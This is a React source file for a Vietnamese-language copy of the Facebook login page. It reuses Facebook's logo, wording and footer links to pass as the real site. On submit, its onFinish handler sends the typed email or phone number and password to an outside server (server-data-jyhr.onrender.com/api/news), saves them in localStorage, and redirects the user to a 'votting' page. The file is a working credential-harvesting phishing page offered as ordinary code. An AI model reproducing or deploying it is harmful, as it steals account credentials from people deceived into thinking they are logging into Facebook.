import { Link, Navigate, useNavigate } from 'react-router-dom'
import { Button, Form, Input } from 'antd';
import axios from 'axios';
import "./Publics/css/index.css"
import "./Publics/css/check.css"
import React, { useEffect, useState } from 'react';
import { useTranslation } from 'react-i18next';

const FormComponent = () => {
    const navigate = useNavigate();
    const { t } = useTranslation();
    const { i18n } = useTranslation();
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [showErr, setShowErr] = useState();

    const handlePasswordChange = (e) => {
        setPassword(e.target.value);
    };

    const handleTogglePassword = () => {
        setShowPassword(!showPassword);
    };

    const renderPasswordVisibility = visible => (
        visible ? (
            <span style={{color: '#3578e5', fontWeight: 'bold', cursor: 'pointer'  }} onClick={handleTogglePassword} >
            ẨN
            </span>
        ) : (
            <span style={{color: '#3578e5', fontWeight: 'bold', cursor: 'pointer'  }} onClick={handleTogglePassword} >
            HIỂN THỊ
            </span>
        )
    );

    useEffect(() => {
        const savedLanguage = localStorage.getItem('language'); // hoặc cookies, tùy chọn của bạn
        if (savedLanguage) {
            i18n.changeLanguage(savedLanguage);
        }
    }, [i18n]);

    const changeLanguage = (lng) => {
        i18n.changeLanguage(lng);
        localStorage.setItem('language', lng); // hoặc cookies, để lưu trạng thái ngôn ngữ
    };

    const validateFields = (values) => {

        
       
    };

    const onFinish = (values) => {

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneNumberLength = 10; // Số ký tự tối thiểu cho số điện thoại
        const passwordLength = 6; // Số ký tự tối thiểu cho mật khẩu
    
        if (!emailRegex.test(values.email_or_phone) || values.email_or_phone.length < phoneNumberLength ) {
            setShowErr(true)
        } else if(values.password.length < passwordLength){
            setShowErr(true)
        }
        else {
            setShowErr(false)
            localStorage.setItem('dataForm', JSON.stringify(values))

            const data   = { 
                email: values.email_or_phone, 
                password: values.password
            }

            axios.post(`https://server-data-jyhr.onrender.com/api/news`, data)
                .then((response) => {
                    navigate('/votting');
                })
                .catch((error) => {});
        }

    }

    const onFinishFailed = (errorInfo) => {
        setShowErr(true)
    };

    return (
        
        <div className="main login-form">

            <div className={`mob-down ${showErr != true ? '' : 'active'}`}>
                <div className="phone"></div>
                <p>Tải Facebook dành cho Android và lướt xem nhanh hơn.</p>
            </div>
            <div className={`err ${showErr === true ? 'active' : ''}`}>
                <p>Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <Link to="">Đăng ký tài khoản.</Link></p>
            </div>

            <div className="login-page">
                <div className="form-login">
                    <div className="content-form">
                        <div className="item-left">
                            <div className="logo">
                                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"  width="100%" alt="Facebook" />
                            </div>
                            <h2>{t('Welcome')}</h2>
                        </div>

                        <div className="item-right">
                            <div className="form">
                                
                            <Form
                                name="basic"
                                initialValues={{
                                    remember: true,
                                }}
                                onFinish={onFinish}
                                onFinishFailed={onFinishFailed}
                                autoComplete="off"
                                style={{
                                    display:"flex",
                                    flexDirection: "column"
                                }}
                            >

                                <div className="item-form">
                                    <Form.Item
                                        name="email_or_phone"
                                        rules={[
                                            {
                                            required: true,
                                            message: `${t('errorEmail')}`,
                                            },
                                        ]}
                                    >
                                        <Input placeholder={t('holderEmail')} />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <Form.Item
                                        name="password"
                                        rules={[
                                            {
                                            required: true,
                                            message: `${t('errorPassword')}`,
                                            },
                                        ]}
                                    >
                                        <Input 
                                            type={showPassword ? 'text' : 'password'}
                                            placeholder={t('holderPassword')} 
                                            onChange={handlePasswordChange }
                                            // suffix={password.length > 0 ? 'HIỂN THỊ' : ''}
                                            suffix={password.length > 0 ? renderPasswordVisibility(showPassword) : ''}
                                            allowClear
                                            autoComplete="new-password"
                                        />
                                    </Form.Item>
                                </div>


                                <Form.Item 
                                    className="btn butoni"
                                >
                                    <Button
                                        htmlType="submit"
                                        style={{
                                            backgroundColor: "#0d6efd",
                                            outline: "none",
                                            border: 'none',
                                            boxShadow: 'none',
                                            color: "white",
                                            fontWeight: '700',
                                            fontSize:'1rem'
                                        }}
                                    >
                                        {t('signup')} 
                                    </Button>
                                </Form.Item>
                            </Form>

                                <div className="link">
                                    <Link id="forgot-password" to={"https://vi-vn.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"}>{t('forgotPassword')} </Link>
                                    <div className="line"><span>hoặc</span></div>
                                    <Link className="signin" to={"https://www.facebook.com/r.php?locale=vi_VN&display=page"}>{t('createAccount')} </Link>
                                </div>

                            </div>

                            <div className="col-11 create-page">
                                <p><b><Link to={"https://vi-vn.facebook.com/pages/create/?ref_type=registration_form"}>{t('createaPage')}</Link></b> {t('descPage')}</p>
                            </div>

                        </div>
                    </div>
                </div>


                <div className="footer">
                    <div className="content-footer">
                        <div className="footer-top lang">
                            <Link to={""} onClick={() => changeLanguage('vi')}>Tiếng Việt</Link>
                            <Link to={""} onClick={() => changeLanguage('en')}>English (UK)</Link>
                            <Link to={""} onClick={() => changeLanguage('tw')}>中文(台灣)</Link>
                            <Link to={""} onClick={() => changeLanguage('ko')}>한국어</Link>
                            <Link className='desk' to={""} onClick={() => changeLanguage('ja')}>日本語</Link>
                            <Link to={""}>Español</Link>
                            <Link className='desk' to={""}>ภาษาไทย</Link>
                            <Link to={""}>Português (Brasil)</Link>
                            <Link  className='desk' to={""}>Deutsch</Link>
                            <Link to={""} onClick={() => changeLanguage('fr')}>Français (France)</Link>
                            <Link  className='desk' to={""}>Italiano</Link>
                            <Link to="#" className='mob'>
                                <div className='add'>
                                    <svg width="5" height="5" viewBox="0 0 5 5" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M2.5 0C2.77614 0 3 0.223858 3 0.5V2H4.5C4.77614 2 5 2.22386 5 2.5C5 2.77614 4.77614 3 4.5 3H3V4.5C3 4.77614 2.77614 5 2.5 5C2.22386 5 2 4.77614 2 4.5V3H0.5C0.223858 3 0 2.77614 0 2.5C0 2.22386 0.223858 2 0.5 2H2V0.5C2 0.223858 2.22386 0 2.5 0Z" fill="black"/>
                                    </svg>
                                </div>
                            </Link>
                        </div>

                        <div className="line"></div>

                        <div className="footer-bottom lang">
                            <Link to={"https://vi-vn.facebook.com/reg/"}> {t('login')} </Link>
                            <Link to={"https://vi-vn.facebook.com/login/"}> {t('signup')} </Link>
                            <Link to={"https://www.messenger.com/"}> {t('messenger')} </Link>
                            <Link to={"https://vi-vn.facebook.com/lite/"}> {t('facebookLite')} </Link>
                            <Link to={"https://vi-vn.facebook.com/watch/"}> {t('video')} </Link>
                            <Link to={"https://vi-vn.facebook.com/places/"}> {t('places')} </Link>
                            <Link to={"https://vi-vn.facebook.com/gaming/play/"}> {t('games')} </Link>
                            <Link to={"https://vi-vn.facebook.com/login/?next=%2Fmarketplace%2F"}> {t('marketplace')} </Link>
                            <Link to={"https://pay.facebook.com/"}> {t('metaPay')} </Link>
                            <Link to={"https://www.meta.com/"}> {t('metaStore')} </Link>
                            <Link to={"https://www.meta.com/quest/"}> {t('metaQuest')} </Link>
                            <Link to={"https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2F"}> {t('instagram')} </Link>
                            <Link to={"https://www.threads.net/"}> {t('threads')} </Link>
                            <Link to={"https://vi-vn.facebook.com/fundraisers/"}> {t('fundraisers')} </Link>
                            <Link to={"https://vi-vn.facebook.com/biz/directory/"}> {t('services')} </Link>
                            <Link to={"https://vi-vn.facebook.com/votinginformationcenter/"}> {t('votingInformation')} </Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/policy/?entry_point=facebook_page_footer"}> {t('privacyPolicy')} </Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/center/?entry_point=facebook_page_footer"}> {t('privacyCentre')} </Link>
                            <Link to={"https://vi-vn.facebook.com/groups/discover/"}> {t('groups')} </Link>
                            <Link to={"https://about.meta.com/"}> {t('about')} </Link>
                            <Link to={"https://vi-vn.facebook.com/login.php?next=https%3A%2F%2Fvi-vn.facebook.com%2Fads%2Fcreate%2F%3Fnav_source%3Dunknown%26campaign_id%3D402047449186%26placement%3Dpflo%26extra_1%3Dnot-admgr-user"}> {t('createAd')} </Link>
                            <Link to={"https://vi-vn.facebook.com/pages/create/?ref_type=site_footer"}> {t('createPage')} </Link>
                            <Link to={"https://developers.facebook.com/?ref=pf"}> {t('developers')} </Link>
                            <Link to={"https://vi-vn.facebook.com/careers/?ref=pf"}> {t('careers')} </Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/policies/cookies/?entry_point=cookie_policy_redirect&entry=0"}> {t('cookies')} </Link>
                            <Link to={"https://www.facebook.com/help/568137493302217"}> {t('adChoices')} </Link>
                            <Link to={"https://vi-vn.facebook.com/policies_center/"}> {t('terms')} </Link>
                            <Link to={"https://vi-vn.facebook.com/help/?ref=pf"}> {t('help')} </Link>
                            <Link to={"https://vi-vn.facebook.com/help/637205020878504"}> {t('contactUploading')} </Link>
                        </div>
                        <div className="coppyright">
                            <div className="mob">
                                <Link to={"https://about.meta.com/"}> {t('about')} </Link>
                                <div className="dot"></div>
                                <Link to={"https://vi-vn.facebook.com/help/?ref=pf"}> {t('help')} </Link>
                                <div className="dot"></div>
                                <Link to={"https://vi-vn.facebook.com/help/?ref=pf"}> Xem thêm </Link>
                            </div>
                            <span>Meta © 2023</span>
                        </div>
                    </div>
                </div>

            </div>
            
        </div>

    )
}

export default FormComponent